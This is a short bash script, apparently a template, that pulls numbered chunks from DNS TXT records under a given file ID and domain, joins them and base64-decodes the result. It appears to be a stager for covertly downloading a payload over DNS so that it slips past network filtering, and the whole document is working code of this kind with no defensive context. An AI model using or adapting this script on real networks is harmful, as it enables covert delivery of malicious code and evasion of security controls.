#!/usr/bin/env bash
payload=''
for i in {1..$NUM_CHUNKS}; do
  part=$$(dig -t TXT $${i}.$FID.$DOMAIN +short | tr -d '"')
  payload+="$${part}"
done
echo "$${payload}" | base64 -d
